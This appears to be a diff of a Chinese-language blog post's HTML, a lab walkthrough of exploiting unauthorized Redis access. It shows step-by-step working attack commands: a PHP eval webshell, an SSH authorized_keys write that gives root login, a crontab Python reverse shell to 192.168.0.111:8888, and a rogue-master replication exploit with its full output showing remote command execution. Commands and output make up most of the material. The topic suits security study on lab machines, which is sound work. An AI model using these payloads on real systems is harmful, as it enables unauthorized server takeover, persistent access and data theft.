-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。<br />shell写入完成，在靶机上来证明：<br />写入webshell<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis6.png"><br />查看shell.php<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis7.png"><br />当数据库过大时，redis写shell的小技巧：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;mocha.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;&lt;?php @eval($_POST[\&quot;mocha\&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。<br />shell写入完成，在靶机上来证明：<br />写入webshell<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis6.png" srcset="/img/loading.gif" lazyload><br />查看shell.php<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis7.png" srcset="/img/loading.gif" lazyload><br />当数据库过大时，redis写shell的小技巧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>set_time_limit(0);<br><span class="hljs-variable">$fp</span>=fopen(<span class="hljs-string">&#x27;mocha.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<br>fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[\&quot;mocha\&quot;]);?&gt;&#x27;</span>);<br><span class="hljs-built_in">exit</span>();<br>?&gt;<br></code></pre></td></tr></table></figure>
 
-<h4 id="4-2-利用“公私钥”认证获取root权限"><a href="#4-2-利用“公私钥”认证获取root权限" class="headerlink" title="4.2 利用“公私钥”认证获取root权限"></a>4.2 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。<br />靶机中开启redis服务：redis-server &#x2F;etc&#x2F;redis.conf<br />在靶机中执行  mkdir &#x2F;root&#x2F;.ssh  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）<br />在攻击机中生成ssh公钥和私钥，密码设置为空：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis8.png"><br />进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; 1.txt</span><br></pre></td></tr></table></figure>
+<h4 id="4-2-利用“公私钥”认证获取root权限"><a href="#4-2-利用“公私钥”认证获取root权限" class="headerlink" title="4.2 利用“公私钥”认证获取root权限"></a>4.2 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。<br />靶机中开启redis服务：redis-server &#x2F;etc&#x2F;redis.conf<br />在靶机中执行  mkdir &#x2F;root&#x2F;.ssh  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）<br />在攻击机中生成ssh公钥和私钥，密码设置为空：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis8.png" srcset="/img/loading.gif" lazyload><br />进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; 1.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/9.png"><br />链接靶机上的redis服务，<br />将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入)：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | redis-cli -h 192.168.0.110 -x <span class="built_in">set</span> crack</span><br></pre></td></tr></table></figure>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/9.png" srcset="/img/loading.gif" lazyload><br />链接靶机上的redis服务，<br />将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 1.txt | redis-cli -h 192.168.0.110 -x <span class="hljs-built_in">set</span> crack<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/10.png"></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/10.png" srcset="/img/loading.gif" lazyload></p>
 <p><br />远程登录靶机的redis服务：redis-cli -h 192.168.0.104 <br />并使用 CONFIG GET dir 命令得到redis备份的路径：<br />更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh)<br />设置上传公钥的备份文件名字为authorized_keys：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get <span class="hljs-built_in">dir</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/11.png"></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/11.png" srcset="/img/loading.gif" lazyload></p>
 <p><br />检查是否更改成功（查看有没有authorized_keys文件)，没有问题就保存然后退出</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get dbfilename</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get dbfilename<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/12.png"><br />至此成功写入ssh公钥到靶机<br />在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#48;&#x2e;&#x31;&#x31;&#48;">&#x72;&#x6f;&#111;&#116;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#48;&#x2e;&#x31;&#x31;&#48;</a><br />成功登录<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/13.png"></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/12.png" srcset="/img/loading.gif" lazyload><br />至此成功写入ssh公钥到靶机<br />在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#x2e;&#49;&#49;&#x30;">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x30;&#x2e;&#49;&#49;&#x30;</a><br />成功登录<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/13.png" srcset="/img/loading.gif" lazyload></p>
 <h4 id="4-3-利用Crontab反弹shell"><a href="#4-3-利用Crontab反弹shell" class="headerlink" title="4.3 利用Crontab反弹shell"></a>4.3 利用Crontab反弹shell</h4><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p>
 <p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 7777</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 7777<br></code></pre></td></tr></table></figure>
 
 <ul>
 <li>攻击步骤</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.0.110</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> xxx  <span class="string">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.0.111\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br><br><span class="hljs-built_in">set</span> xxx  <span class="hljs-string">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.0.111\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span><br><br><br><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron<br><br>config <span class="hljs-built_in">set</span> dbfilename root<br><br>save<br></code></pre></td></tr></table></figure>
 
-<p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/14.png"><br /> <br />登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/15.png"></p>
+<p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/14.png" srcset="/img/loading.gif" lazyload><br /> <br />登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/15.png" srcset="/img/loading.gif" lazyload></p>
 <p>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，<br />因为自己如果不使用redis写任务计划文件，而是正常向&#x2F;etc&#x2F;cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p>
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/16.png"></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/16.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li><strong>解决办法（未完待续）</strong></li>
 </ul>
-<p>发现ubantu下默认使用&#x2F;bin&#x2F;dash执行脚本的问题，解决方式:将shell环境修改为bash。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/17.png"></p>
+<p>发现ubantu下默认使用&#x2F;bin&#x2F;dash执行脚本的问题，解决方式:将shell环境修改为bash。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/17.png" srcset="/img/loading.gif" lazyload></p>
 <h4 id="4-4-通过主从复制-GetShell"><a href="#4-4-通过主从复制-GetShell" class="headerlink" title="4.4 通过主从复制 GetShell"></a>4.4 通过主从复制 GetShell</h4><h5 id="4-4-1-redis主从复制"><a href="#4-4-1-redis主从复制" class="headerlink" title="4.4.1 redis主从复制"></a>4.4.1 redis主从复制</h5><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
 <p>这里我们开两台docker来做测试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-1-7-ubuntu:~/lorexxar$ sudo docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">3fdb2479af9c        redis:5.0           &quot;docker-entrypoint.s…&quot;   22 hours ago        Up 4 seconds        0.0.0.0:6380-&gt;6379/tcp   epic_khorana</span><br><span class="line">3e313c7498c2        redis:5.0           &quot;docker-entrypoint.s…&quot;   23 hours ago        Up 23 hours         0.0.0.0:6379-&gt;6379/tcp   vibrant_hodgkin</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">1</span>-<span class="hljs-number">7</span>-ubuntu:~/lorexxar$ sudo docker ps<br><span class="hljs-attribute">CONTAINER</span> ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-attribute">3fdb2479af9c</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">22</span> hours ago        Up <span class="hljs-number">4</span> seconds        <span class="hljs-number">0.0.0.0:6380</span>-&gt;<span class="hljs-number">6379</span>/tcp   epic_khorana<br><span class="hljs-attribute">3e313c7498c2</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">23</span> hours ago        Up <span class="hljs-number">23</span> hours         <span class="hljs-number">0.0.0.0:6379</span>-&gt;<span class="hljs-number">6379</span>/tcp   vibrant_hodgkin<br></code></pre></td></tr></table></figure>
 
 <p>然后通过slaveof可以设置主从状态</p>
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/18.png"><br />这样一来数据就会自动同步了</p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/18.png" srcset="/img/loading.gif" lazyload><br />这样一来数据就会自动同步了</p>
 <h5 id="4-4-2-redis模块"><a href="#4-4-2-redis模块" class="headerlink" title="4.4.2 redis模块"></a>4.4.2 redis模块</h5><p>在了解了主从同步之后，我们还需要对redis的模块有所了解。<br />在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。<br />编写恶意so文件的代码<br /><a target="_blank" rel="noopener" href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p>
 <h5 id="4-4-3-利用原理"><a href="#4-4-3-利用原理" class="headerlink" title="4.4.3 利用原理"></a>4.4.3 利用原理</h5><p>Pavel Toporkov在2018年的zeronights会议上，分享了关于这个漏洞的详细原理。<br /><a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p>
-<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/19.png"></p>
+<p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/19.png" srcset="/img/loading.gif" lazyload></p>
 <h5 id="4-4-4-复现过程"><a href="#4-4-4-复现过程" class="headerlink" title="4.4.4 复现过程"></a>4.4.4 复现过程</h5><p>选择使用模拟的恶意服务端来作为主机，并模拟fullresync请求。</p>
 <ul>
 <li>第一个脚本</li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br />然后直接通过脚本来攻击服务端</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/mytools/new/redis-rogue-getshell]</span><br><span class="line">└─# ./redis-master.py -r 192.168.0.110 -p 6379 -L 192.168.0.111 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;</span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$7\r\nSLAVEOF\r\n$13\r\n192.168.0.111\r\n$4\r\n8888\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;PING\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;REPLCONF listening-port 6379\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;REPLCONF capa eof capa psync2\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;PSYNC af12f81deb86c2f8397ae9077ea01eea50e506c1 1\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$8\r\n./exp.so\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br><span class="line">&gt;&gt; send data: b&#x27;*2\r\n$11\r\nsystem.exec\r\n$2\r\nid\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;$49\r\neuid=999(redis) gid=999(redis) groups=999(redis)\n\r\n&#x27;</span><br><span class="line">euid=999(redis) gid=999(redis) groups=999(redis)</span><br><span class="line"></span><br><span class="line">&gt;&gt; send data: b&#x27;*3\r\n$6\r\nMODULE\r\n$6\r\nUNLOAD\r\n$6\r\nsystem\r\n&#x27;</span><br><span class="line">&gt;&gt; receive data: b&#x27;+OK\r\n&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">──(root💀kali)-[~/mytools/new/redis-rogue-getshell]<br>└─# ./redis-master.py -r 192.168.0.110 -p 6379 -L 192.168.0.111 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$13\r<span class="hljs-symbol">\n</span>192.168.0.111\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>8888\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PING\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF listening-port 6379\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF capa eof capa psync2\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PSYNC af12f81deb86c2f8397ae9077ea01eea50e506c1 1\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>LOAD\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>./exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>NO\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>ONE\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>dump.rdb\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*2\r<span class="hljs-symbol">\n</span>$11\r<span class="hljs-symbol">\n</span>system.exec\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>id\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;$49\r<span class="hljs-symbol">\n</span>euid=999(redis) gid=999(redis) groups=999(redis)<span class="hljs-symbol">\n</span>\r<span class="hljs-symbol">\n</span>&#x27;<br>euid=999(redis) gid=999(redis) groups=999(redis)<br><br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>UNLOAD\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>system\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br></code></pre></td></tr></table></figure>
 
 <ul>
 <li>第二个脚本</li>
 </ul>
-<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/20.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/20.png" srcset="/img/loading.gif" lazyload></p>
